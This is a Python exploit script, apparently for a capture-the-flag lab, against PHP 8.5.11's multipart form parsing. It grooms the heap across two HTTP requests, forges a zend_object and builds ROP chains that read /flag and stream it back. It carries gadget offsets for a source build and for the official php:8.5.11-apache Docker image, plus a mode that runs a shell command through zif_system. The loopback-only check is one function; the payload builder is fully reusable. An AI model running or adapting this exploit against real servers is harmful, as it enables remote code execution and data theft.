#!/usr/bin/env python3
"""Loopback-only poison-safe seed/fire terminal for the PHP 8.5.11 twin.

Request C places a forged 2528-byte value in ext/filter's first registered
``IF_G(post_array)`` zend_string copy, builds 45 large-key arrays, and uses a
final duplicate-header field to bail out during multipart parsing, before
module RINIT. Consequently filter RSHUTDOWN cannot individually free (and
poison) that registered copy; the non-full memory-manager reset makes its
bin-2560 block reusable while leaving the high payload bytes intact. The
RFC1867 raw buffer is a different allocation and is freed/poisoned normally.
The nested-file producer remains available as a diagnostic option, but without
session carriers it is not sufficient by itself to exhaust this 128 MiB build.

Request D is the stock incomplete-bucket terminal with no ``pad`` duplicate.
Its cap-64 HashTable allocation is also bin 2560.  When that allocation reuses
the seeded block, buckets 0..44 replace only the low portion; the uninitialised
bucket 45 still contains the forged zval and direct-response ROP chain.

The program accepts only plain-HTTP loopback ``/index.php`` targets.  It has
no live-target or proxy mode.  A successful run requires a flag in D's actual
response; a disconnect, crash, or marker alone is never success.
"""

from __future__ import annotations

import argparse
import hashlib
import json
import os
from pathlib import Path
import re
import secrets
import socket
import struct
import time
import urllib.parse


LOOPBACK = {"127.0.0.1", "localhost", "::1"}
BOUNDARY = b"AMP128BOUNDARY"
SEED_VALUE_BYTES = 2528
SEED_BUCKET_OFFSET = 0x788
DEFAULT_TERMINAL_BLOCK = 0x59400
DEFAULT_HEADERS = 402_500
RESPONSE_LIMIT = 8 << 20
FLAG_RE = re.compile(
    rb"(?:[A-Za-z0-9_]{2,24}\{[^\r\n}]{4,256}\}|"
    rb"[0-9a-fA-F]{8}-(?:[0-9a-fA-F]{4}-){3}[0-9a-fA-F]{12})"
)

DEFAULT_PROFILE = "source-full"
PROFILES = {
    # Source-built PHP 8.5.11 with the full standard-extension set on the
    # Ubuntu 26.04 behavior-matching twin.
    "source-full": {
        "dtor": 0x7EAF60,
        "block": 0x59400,
        "pivot": 0x67289E,
        "pop_rdi": 0x19DC55,
        "pop_rsi": 0x1D8B85,
        "ret": 0x18501A,
        "pop_rdx": 0x25DD5B,
        "open_plt": 0x189DD0,
        "read_plt": 0x18F220,
        "write_plt": 0x1871B0,
    },
    # Docker Official Image php:8.5.11-apache, image ID
    # sha256:b384c1b31d2008af2160a735bb856317926f893553293f526024019a31d0fd6b.
    # The image imports open64 rather than open; open_plt names the call slot
    # consumed by the common ROP builder.
    "official-docker": {
        "dtor": 0x7B47A0,
        "block": 0x59400,
        "pivot": 0x64904E,
        "pop_rdi": 0x197128,
        "pop_rsi": 0x195A89,
        "ret": 0x183016,
        "pop_rdx": 0x191B6A,
        "open_plt": 0x190E10,
        "read_plt": 0x18AF30,
        "write_plt": 0x18E610,
        "pop_rax": 0x1D0B83,
        "store_rax_rsi": 0x1EB19B,
        "add_edi_eax": 0x1D01DA,
        "rax_to_rdi": 0x36333C,
        "push_rdi": 0x54DBE7,
        "push_rax": 0x2DEBA3,
        "zif_system": 0x5996E0,
    },
}
PROFILE_METADATA = {
    "source-full": {
        "build": "source-built PHP 8.5.11 full-module Ubuntu twin",
        "open_symbol": "open@plt",
    },
    "official-docker": {
        "build": "Docker Official Image php:8.5.11-apache",
        "image_id": (
            "sha256:b384c1b31d2008af2160a735bb856317926f893553293f526024019a31d0fd6b"
        ),
        "open_symbol": "open64@plt",
    },
}

# Backwards-compatible alias for callers that explicitly target the source
# build. New code should select from PROFILES and pass the profile explicitly.
FULL_PROFILE = PROFILES[DEFAULT_PROFILE]


def u32(value: int) -> bytes:
    return struct.pack("<I", value)


def u64(value: int) -> bytes:
    return struct.pack("<Q", value)


def validate_target(value: str) -> urllib.parse.SplitResult:
    parsed = urllib.parse.urlsplit(value)
    if not (
        parsed.scheme == "http"
        and parsed.hostname in LOOPBACK
        and parsed.path == "/index.php"
        and parsed.port is not None
        and parsed.username is None
        and parsed.password is None
        and not parsed.query
        and not parsed.fragment
    ):
        raise ValueError("target must be a loopback stock-twin /index.php URL")
    return parsed


def preamble_pad(body: bytes, size: int) -> bytes:
    if size == 0:
        return body
    if size < 2:
        raise ValueError("preamble must be zero or at least two bytes")
    return b"z" * (size - 2) + b"\r\n" + body


def multipart_field(name: bytes, value: bytes) -> bytes:
    return (
        b"--" + BOUNDARY
        + b'\r\nContent-Disposition: form-data; name="' + name
        + b'"\r\n\r\n' + value + b"\r\n"
    )


def multipart_empty_file(name: bytes) -> bytes:
    return (
        b"--" + BOUNDARY
        + b'\r\nContent-Disposition: form-data; name="' + name
        + b'"; filename=""\r\n\r\n\r\n'
    )


def large_key(index: int, size: int = 80_000) -> bytes:
    prefix = f"k{index:02d}".encode("ascii")
    return prefix + b"K" * (size - len(prefix))


def forged_seed(
    heap_base: int,
    libphp_base: int,
    block_offset: int,
    client_fd: int,
    marker: bytes,
    *,
    profile: dict[str, int] | None = None,
    fd_mode: str | None = None,
    system_command: bytes | None = None,
) -> bytes:
    """Build a self-contained forge entirely in bucket 45's surviving tail."""
    if not 1 <= len(marker) <= 16:
        raise ValueError("marker must be 1..16 bytes")
    block = heap_base + block_offset
    value = block + 0x18

    # All live material starts at or above value+0x788.  D writes cap-64
    # buckets 0..44 through value+0x787 and therefore cannot touch it.
    handlers_offset = 2000
    object_offset = 2048
    chain_offset = object_offset + 0x40
    # Re-laid-out for a 352-byte chain window (44 qwords):
    #   marker/read buffer moved into the 1944..2000 gap (read_size 32),
    #   chain 2112..2464, path 2464, header 2470 (pad 2528).
    buffer_offset = 1944
    read_size = 40
    path_offset = 2464
    header_offset = 2470
    response_header = b"HTTP/1.1 200 OK\r\nConnection: close\r\n\r\n"
    pivot_marker = b"PIVOT-" + marker[9:]
    first_write = response_header + pivot_marker
    if header_offset + len(first_write) > SEED_VALUE_BYTES:
        raise ValueError("early pivot marker exceeds the seed pad")

    handlers = value + handlers_offset
    obj = value + object_offset
    p = FULL_PROFILE if profile is None else profile
    if fd_mode == "system-copy":
        # Reuse the stock, locally proven zif_system frame and write the flag
        # to a per-run webroot file.  This avoids all socket-fd assumptions.
        import php8511_rce

        filename = b"z" + marker[9:-1]
        default_command = b"cp /flag /var/www/html/php/" + filename
        command = (system_command or default_command).rstrip(b"\x00") + b"\x00"
        return php8511_rce.build_rce_pad(
            heap_base,
            libphp_base,
            command,
            block_offset=block_offset,
            pivot_offset=p["pivot"],
            pop_rdi_offset=p["pop_rdi"],
            pop_rsi_offset=p["pop_rsi"],
            ret_offset=p["ret"],
            zif_system_offset=p["zif_system"],
        )
    pivot = libphp_base + p["pivot"]
    pop_rdi = libphp_base + p["pop_rdi"]
    pop_rsi = libphp_base + p["pop_rsi"]
    pop_rdx = libphp_base + p["pop_rdx"]
    ret = libphp_base + p["ret"]
    open_plt = libphp_base + p["open_plt"]
    read_plt = libphp_base + p["read_plt"]
    write_plt = libphp_base + p["write_plt"]

    pad = bytearray(b"S" * SEED_VALUE_BYTES)
    pad[path_offset:path_offset + 6] = b"/flag\x00"
    pad[buffer_offset:buffer_offset + len(marker)] = marker
    pad[header_offset:header_offset + len(first_write)] = first_write

    # Minimal object-handler table used by the already-proven stock terminal.
    pad[handlers_offset:handlers_offset + 8] = u64(0)
    pad[handlers_offset + 8:handlers_offset + 16] = u64(pivot)
    pad[handlers_offset + 16:handlers_offset + 24] = u64(ret)

    # zend_object header.  The pivot consumes the bytes immediately following
    # it as its initial stack, matching the existing non-poison proof.
    pad[object_offset:object_offset + 4] = u32(1)
    pad[object_offset + 4:object_offset + 8] = u32(8)  # IS_OBJECT
    pad[object_offset + 8:object_offset + 12] = u32(0)
    pad[object_offset + 0x10:object_offset + 0x18] = u64(0)
    pad[object_offset + 0x18:object_offset + 0x20] = u64(handlers)
    pad[object_offset + 0x20:object_offset + 0x28] = u64(0)
    pad[object_offset + 0x28:object_offset + 0x40] = b"\x00" * 24

    chain = [
        # Return a valid close-delimited response before reading the flag.
        pop_rdi, client_fd,
        pop_rsi, value + header_offset,
        pop_rdx, len(response_header),
        ret, write_plt,
        # open("/flag", O_RDONLY), then read from the next descriptor.
        pop_rdi, value + path_offset,
        pop_rsi, 0,
        ret, open_plt,
        pop_rdi, client_fd + 1,
        pop_rsi, value + buffer_offset + len(marker),
        pop_rdx, read_size,
        ret, read_plt,
        # Prefix the flag with a per-run marker and stream it to the client.
        pop_rdi, client_fd,
        pop_rsi, value + buffer_offset,
        pop_rdx, len(marker) + read_size,
        ret, write_plt,
        0,
    ]
    if fd_mode == "derived-sweep":
        # Enumerate candidate output fds: file_fd-1, -2, -3 (saved on the stack),
        # read the flag once, then write marker+flag to each candidate.
        push_rdi = libphp_base + p["push_rdi"]
        push_rax_pop_rdi = libphp_base + p["rax_to_rdi"]
        add_edi_eax = libphp_base + p["add_edi_eax"]
        chain = [
            pop_rdi, value + path_offset,
            pop_rsi, 0,
            ret, open_plt,                  # rax = file fd
            pop_rdi, 0xFFFFFFFFFFFFFFFF,
            add_edi_eax, push_rdi,          # save fd-1
            pop_rdi, 0xFFFFFFFFFFFFFFFE,
            add_edi_eax, push_rdi,          # save fd-2
            pop_rdi, 0xFFFFFFFFFFFFFFFD,
            add_edi_eax, push_rdi,          # save fd-3
            push_rax_pop_rdi,               # rdi = file fd
            pop_rsi, value + buffer_offset + len(marker),
            pop_rdx, read_size,
            ret, read_plt,                  # flag into buffer
            pop_rdi,                        # fd-3
            pop_rsi, value + buffer_offset,
            pop_rdx, len(marker) + read_size,
            ret, write_plt,
            pop_rdi,                        # fd-2
            pop_rsi, value + buffer_offset,
            pop_rdx, len(marker) + read_size,
            ret, write_plt,
            pop_rdi,                        # fd-1
            pop_rsi, value + buffer_offset,
            pop_rdx, len(marker) + read_size,
            ret, write_plt,
            0,
        ]
        chain_bytes = b"".join(u64(item) for item in chain)
        if chain_offset + len(chain_bytes) > path_offset:
            raise ValueError("sweep ROP chain overlaps the path")
        pad[chain_offset:chain_offset + len(chain_bytes)] = chain_bytes
        pad[SEED_BUCKET_OFFSET:SEED_BUCKET_OFFSET + 8] = u64(obj)
        pad[SEED_BUCKET_OFFSET + 8:SEED_BUCKET_OFFSET + 12] = u32(8 | 0x100)
        pad[SEED_BUCKET_OFFSET + 12:SEED_BUCKET_OFFSET + 16] = u32(0)
        return bytes(pad)

    if fd_mode == "derived-adjacent":
        # No stack saves: three sequential opens give socket+1, +2, +3.
        #   fd1 -> derive socket (fd1-1) -> write the HTTP header
        #   fd2 -> read the flag
        #   fd3 -> derive socket (fd3-3) -> write marker+flag
        push_rax_pop_rdi = libphp_base + p["rax_to_rdi"]
        add_edi_eax = libphp_base + p["add_edi_eax"]
        chain = [
            pop_rdi, value + path_offset,
            pop_rsi, 0,
            ret, open_plt,                  # rax = fd1
            pop_rdi, 0xFFFFFFFFFFFFFFFF,
            add_edi_eax,                    # rdi = fd1 - 1 = socket
            pop_rsi, value + header_offset,
            pop_rdx, len(first_write),
            ret, write_plt,                 # header -> socket
            pop_rdi, value + path_offset,
            pop_rsi, 0,
            ret, open_plt,                  # rax = fd2
            push_rax_pop_rdi,               # rdi = fd2
            pop_rsi, value + buffer_offset + len(marker),
            pop_rdx, read_size,
            ret, read_plt,                  # flag
            pop_rdi, value + path_offset,
            pop_rsi, 0,
            ret, open_plt,                  # rax = fd3
            pop_rdi, 0xFFFFFFFFFFFFFFFD,
            add_edi_eax,                    # rdi = fd3 - 3 = socket
            pop_rsi, value + buffer_offset,
            pop_rdx, len(marker) + read_size,
            ret, write_plt,                 # marker + flag -> socket
            0,
        ]
        chain_bytes = b"".join(u64(item) for item in chain)
        if chain_offset + len(chain_bytes) > path_offset:
            raise ValueError("derived ROP chain overlaps the path")
        pad[chain_offset:chain_offset + len(chain_bytes)] = chain_bytes
        pad[SEED_BUCKET_OFFSET:SEED_BUCKET_OFFSET + 8] = u64(obj)
        pad[SEED_BUCKET_OFFSET + 8:SEED_BUCKET_OFFSET + 12] = u32(8 | 0x100)
        pad[SEED_BUCKET_OFFSET + 12:SEED_BUCKET_OFFSET + 16] = u32(0)
        return bytes(pad)

    chain_bytes = b"".join(u64(item) for item in chain)
    if chain_offset + len(chain_bytes) > path_offset:
        raise ValueError("ROP chain overlaps the path")
    pad[chain_offset:chain_offset + len(chain_bytes)] = chain_bytes

    # Bucket 45's zval: object pointer, type_info IS_OBJECT|collectable.
    pad[SEED_BUCKET_OFFSET:SEED_BUCKET_OFFSET + 8] = u64(obj)
    pad[SEED_BUCKET_OFFSET + 8:SEED_BUCKET_OFFSET + 12] = u32(8 | 0x100)
    pad[SEED_BUCKET_OFFSET + 12:SEED_BUCKET_OFFSET + 16] = u32(0)
    return bytes(pad)


def probe_seed(index: int) -> bytes:
    """Non-executable seed whose identity is easy to find after C's reset."""
    tag = f"SEED-{index:03d}-RAW-PRESERVE".encode("ascii")
    repeats = (SEED_VALUE_BYTES + len(tag) - 1) // len(tag)
    return (tag * repeats)[:SEED_VALUE_BYTES]


def build_seed_body(
    heap_base: int,
    libphp_base: int,
    block_offset: int,
    client_fd: int,
    marker: bytes,
    *,
    seeds: int,
    oom_count: int,
    oom_depth: int,
    oom_headers: int = 0,
    pressure_fields: int = 0,
    probe: bool = False,
    profile: dict[str, int] | None = None,
    fd_mode: str | None = None,
    system_command: bytes | None = None,
    **extra,
) -> bytes:
    """Build C: seed filter's first registered copy, then force parse OOM."""
    parts: list[bytes] = []
    forged = forged_seed(
        heap_base,
        libphp_base,
        block_offset,
        client_fd,
        marker,
        profile=profile,
        fd_mode=fd_mode,
        system_command=system_command,
    )
    for index in range(seeds):
        value = probe_seed(index) if probe else forged
        parts.append(multipart_field(f"s{index:03d}".encode("ascii"), value))
    for index in range(pressure_fields):
        name = b"q[" + large_key(index) + b"][c]"
        parts.append(multipart_field(name, b"v"))
    for index in range(oom_count):
        name = b"f[" + str(index).encode("ascii") + b"]" + b"[x]" * oom_depth
        parts.append(multipart_empty_file(name))
    body = bytearray(b"".join(parts))
    if oom_headers:
        body += b"--" + BOUNDARY + b"\r\n"
        body += b"X: a\r\n" * oom_headers
        body += b'Content-Disposition: form-data; name="oom"\r\n\r\nx\r\n'
    body += b"--" + BOUNDARY + b"--\r\n"
    if not 0 < len(body) < 8 * 1024 * 1024:
        raise ValueError("seed body is outside post_max_size")
    return bytes(body)


def build_fire_body(*, headers: int, **extra) -> bytes:
    """Build D: no pad field, with bucket 45 counted before key-allocation OOM."""
    if not 1 <= headers <= 1_200_000:
        raise ValueError("headers must be in 1..1200000")
    payload = bytearray()
    payload += multipart_field(b"memshift", b"M" * 40_000)
    for index in range(45):
        name = b"a[" + large_key(index) + b"][c]"
        payload += multipart_field(name, b"v")
    final_name = b"a[" + large_key(45) + b"][c]"
    payload += b"--" + BOUNDARY + b"\r\n"
    payload += b"X: a\r\n" * headers
    payload += (
        b'Content-Disposition: form-data; name="' + final_name
        + b'"\r\n\r\nv\r\n--' + BOUNDARY + b"--\r\n"
    )
    if not 0 < len(payload) < 8 * 1024 * 1024:
        raise ValueError("fire body is outside post_max_size")
    return bytes(payload)


def exchange(
    host: str,
    port: int,
    path: str,
    body: bytes,
    timeout: float,
) -> bytes:
    request = (
        f"POST {path} HTTP/1.1\r\n"
        f"Host: {host}:{port}\r\n"
        "User-Agent: poison-seed-fire-lab/1\r\n"
        f"Content-Type: multipart/form-data; boundary={BOUNDARY.decode()}\r\n"
        f"Content-Length: {len(body)}\r\n"
        "Connection: close\r\n\r\n"
    ).encode("ascii") + body
    sock = socket.create_connection((host, port), timeout=timeout)
    sock.settimeout(timeout)
    response = bytearray()
    try:
        sock.sendall(request)
        while len(response) < RESPONSE_LIMIT:
            try:
                chunk = sock.recv(min(65536, RESPONSE_LIMIT - len(response)))
            except (OSError, socket.timeout):
                break
            if not chunk:
                break
            response.extend(chunk)
    finally:
        sock.close()
    return bytes(response)


def response_record(raw: bytes, marker: bytes) -> dict:
    head, separator, body = raw.partition(b"\r\n\r\n")
    match = re.match(rb"HTTP/1\.[01]\s+(\d{3})(?:\s|$)", head)
    entity = body if separator else raw
    marker_offset = entity.find(marker)
    flag = (
        FLAG_RE.match(entity, marker_offset + len(marker))
        if marker_offset >= 0 else None
    )
    return {
        "status": int(match.group(1)) if match else 0,
        "response_bytes": len(raw),
        "body_bytes": len(entity),
        "oom": b"Allowed memory size" in raw and b"exhausted" in raw,
        "marker": marker_offset >= 0,
        "marker_immediately_precedes_flag": bool(flag),
        "flag": flag.group(0).decode("ascii", "replace") if flag else None,
        "sha256": hashlib.sha256(raw).hexdigest(),
        "body_preview": entity[:320].decode("latin1", "replace"),
    }


def write_exclusive(path: Path, document: dict) -> None:
    payload = (json.dumps(document, indent=2, sort_keys=True) + "\n").encode()
    flags = os.O_WRONLY | os.O_CREAT | os.O_EXCL
    if hasattr(os, "O_NOFOLLOW"):
        flags |= os.O_NOFOLLOW
    descriptor = os.open(path, flags, 0o600)
    try:
        os.write(descriptor, payload)
        os.fsync(descriptor)
    finally:
        os.close(descriptor)


def parse_int(value: str) -> int:
    return int(value, 0)


def main() -> int:
    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument("--target", required=True)
    parser.add_argument(
        "--profile",
        choices=tuple(PROFILES),
        default=DEFAULT_PROFILE,
        help="build-specific libphp ROP profile",
    )
    parser.add_argument("--heap", type=parse_int, required=True)
    parser.add_argument("--libphp", type=parse_int, required=True)
    parser.add_argument("--block-offset", type=parse_int, default=DEFAULT_TERMINAL_BLOCK)
    parser.add_argument("--client-fd", type=int, default=10)
    parser.add_argument("--seeds", type=int, default=1)
    parser.add_argument("--oom-count", type=int, default=0)
    parser.add_argument("--oom-depth", type=int, default=57)
    parser.add_argument("--seed-oom-headers", type=int, default=426_681)
    parser.add_argument("--seed-pressure-fields", type=int, default=45)
    parser.add_argument("--headers", type=int, default=DEFAULT_HEADERS)
    parser.add_argument("--timeout", type=float, default=120.0)
    parser.add_argument("--preamble", type=int, default=0)
    parser.add_argument("--calibration-worker-pid", type=int)
    parser.add_argument("--probe", action="store_true")
    parser.add_argument("--seed-only", action="store_true")
    parser.add_argument(
        "--nested-warmup",
        action="store_true",
        help="send one benign 8-seed/57x950 multipart request before C",
    )
    parser.add_argument("--out", required=True, type=Path)
    args = parser.parse_args()

    try:
        target = validate_target(args.target)
    except ValueError as error:
        parser.error(str(error))
    if args.heap & 0x1FFFFF or args.libphp & 0x1FFFFF:
        parser.error("heap and libphp bases must be 2 MiB aligned")
    if not 0x700000000000 <= args.heap < 0x800000000000:
        parser.error("heap must be a canonical userspace pointer")
    if not 0x700000000000 <= args.libphp < 0x800000000000:
        parser.error("libphp must be a canonical userspace pointer")
    if args.block_offset < 0 or args.block_offset >= 0x200000:
        parser.error("block-offset must lie in the main 2 MiB chunk")
    if args.block_offset % 0x200:
        parser.error("block-offset must be 0x200 aligned")
    if not 1 <= args.client_fd <= 1024:
        parser.error("client-fd must be in 1..1024")
    if not 1 <= args.seeds <= 64:
        parser.error("seeds must be in 1..64")
    if not 0 <= args.oom_count <= 1000:
        parser.error("oom-count must be in 0..1000")
    if not 1 <= args.oom_depth <= 63:
        parser.error("oom-depth must be in 1..63")
    if not 0 <= args.seed_oom_headers <= 500_000:
        parser.error("seed-oom-headers must be in 0..500000")
    if not 0 <= args.seed_pressure_fields <= 60:
        parser.error("seed-pressure-fields must be in 0..60")
    if args.oom_count == 0 and args.seed_oom_headers == 0:
        parser.error("seed request needs a nested or header OOM producer")
    if not 0.1 <= args.timeout <= 300:
        parser.error("timeout must be in 0.1..300")
    if args.preamble != 0 and not 2 <= args.preamble <= 1_100_000:
        parser.error("preamble must be zero or in 2..1100000")
    if args.calibration_worker_pid is not None and args.calibration_worker_pid <= 1:
        parser.error("calibration-worker-pid must be greater than one")
    profile = PROFILES[args.profile]
    if args.block_offset != profile["block"]:
        parser.error(
            "block-offset must match the selected profile's calibrated block"
        )
    output = args.out.resolve()
    if os.path.lexists(output) or not output.parent.is_dir():
        parser.error("fresh output in an existing directory required")

    # A non-word delimiter keeps the marker from being consumed as part of a
    # conventional ``flag{...}`` token by the evidence parser.
    marker = ("SEEDFIRE-" + secrets.token_hex(3) + "|").encode("ascii")
    warmup_body = None
    if args.nested_warmup:
        warmup_body = build_seed_body(
            args.heap,
            args.libphp,
            args.block_offset,
            args.client_fd,
            marker,
            seeds=8,
            oom_count=950,
            oom_depth=57,
            oom_headers=0,
            pressure_fields=0,
            probe=True,
            profile=profile,
        )
    seed_body = build_seed_body(
        args.heap,
        args.libphp,
        args.block_offset,
        args.client_fd,
        marker,
        seeds=args.seeds,
        oom_count=args.oom_count,
        oom_depth=args.oom_depth,
        oom_headers=args.seed_oom_headers,
        pressure_fields=args.seed_pressure_fields,
        probe=args.probe,
        profile=profile,
    )
    fire_body = build_fire_body(headers=args.headers)
    seed_wire = preamble_pad(seed_body, args.preamble)
    fire_wire = preamble_pad(fire_body, args.preamble)
    warmup_wire = (
        preamble_pad(warmup_body, args.preamble)
        if warmup_body is not None else None
    )
    if (
        len(seed_wire) >= 8 * 1024 * 1024
        or len(fire_wire) >= 8 * 1024 * 1024
        or (warmup_wire is not None and len(warmup_wire) >= 8 * 1024 * 1024)
    ):
        parser.error("preamble makes a request reach post_max_size")
    host = target.hostname or ""
    port = target.port
    began = time.monotonic()
    warmup = None
    if warmup_wire is not None:
        warmup_raw = exchange(host, port, target.path, warmup_wire, args.timeout)
        warmup = response_record(warmup_raw, marker)
    seed_raw = exchange(host, port, target.path, seed_wire, args.timeout)
    seed = response_record(seed_raw, marker)
    fire_raw = b""
    fire = None
    if not args.seed_only:
        fire_raw = exchange(host, port, target.path, fire_wire, args.timeout)
        fire = response_record(fire_raw, marker)

    seed_gate = seed["status"] == 200 and seed["oom"]
    warmup_gate = warmup is None or (
        warmup["status"] == 200 and not warmup["oom"]
    )
    flag = fire and fire["flag"] if seed_gate and warmup_gate else None
    verdict = "FLAG_OK" if flag else ("SEED_ONLY" if args.seed_only else "TERMINAL_MISS")
    request_count = (1 if args.seed_only else 2) + int(args.nested_warmup)
    document = {
        "schema": "cfctf-r8/poison-seed-fire-lab/v1",
        "target": args.target,
        "scope": {
            "loopback_only": True,
            "request_cap": request_count,
            "poison_required": True,
            "success_gate": "flag in D response",
            "success_gate_detail": (
                "C status 200 plus OOM; optional warmup status 200 without OOM; "
                "D marker immediately followed by parsed flag"
            ),
            "probe": args.probe,
            "nested_warmup": args.nested_warmup,
            "preamble_bytes": args.preamble,
            "calibration_worker_pid": args.calibration_worker_pid,
        },
        "build_profile": {
            "name": args.profile,
            **PROFILE_METADATA[args.profile],
            "offsets": {key: hex(value) for key, value in profile.items()},
        },
        "addresses": {
            "heap": hex(args.heap),
            "libphp": hex(args.libphp),
            "terminal_block": hex(args.heap + args.block_offset),
            "terminal_arData": hex(args.heap + args.block_offset + 0x200),
            "bucket45": hex(args.heap + args.block_offset + 0x7A0),
        },
        "parameters": {
            "block_offset": hex(args.block_offset),
            "client_fd": args.client_fd,
            "seeds": args.seeds,
            "oom_count": args.oom_count,
            "oom_depth": args.oom_depth,
            "seed_oom_headers": args.seed_oom_headers,
            "seed_pressure_fields": args.seed_pressure_fields,
            "headers": args.headers,
        },
        "wire": {
            "warmup_native_bytes": len(warmup_body) if warmup_body is not None else 0,
            "warmup_bytes": len(warmup_wire) if warmup_wire is not None else 0,
            "seed_native_bytes": len(seed_body),
            "fire_native_bytes": len(fire_body),
            "seed_bytes": len(seed_wire),
            "fire_bytes": len(fire_wire),
            "boundary": BOUNDARY.decode("ascii"),
        },
        "marker": marker.decode("ascii"),
        "warmup": warmup,
        "seed": seed,
        "fire": fire,
        "gates": {
            "seed_status_200_and_oom": seed_gate,
            "warmup_status_200_without_oom": warmup_gate,
            "fire_marker_immediately_precedes_flag": bool(
                fire and fire["marker_immediately_precedes_flag"]
            ),
        },
        "request_count": request_count,
        "elapsed_s": round(time.monotonic() - began, 3),
        "verdict": verdict,
    }
    write_exclusive(output, document)
    print(json.dumps(document, indent=2, sort_keys=True))
    return 0 if verdict in {"FLAG_OK", "SEED_ONLY"} else 2


if __name__ == "__main__":
    raise SystemExit(main())

# Our stock twin (official php-8.5.11 source build, Ubuntu 26.04 twin):
# offsets verified from /tmp/libphp-twin.so (nm/objdump/byte scan).
PROFILES["stock-twin"] = {
    "dtor": 0x7AE960,
    "block": 0x59400,
    "pivot": 0x6362AE,
    "pop_rdi": 0x280D8D,
    "pop_rsi": 0x2CBE07,
    "pop_rdx": 0x24E75B,
    "ret": 0x280D8E,
    "open_plt": 0x17CBD0,
    "read_plt": 0x181DE0,
    "write_plt": 0x17A0C0,
    "pop_rax": 0x2149CE,
    "store_rax_rsi": 0x1E12FB,
    "add_edi_eax": 0x1C4A28,
    "rax_to_rdi": 0x34BC8C,
    "push_rdi": 0x329565,
    "push_rax": 0x1D6E34,
}
PROFILE_METADATA["stock-twin"] = {
    "build": "official php-8.5.11 source tarball, Ubuntu 26.04 twin (Apache 2.4.66)",
    "open_symbol": "open@plt",
}
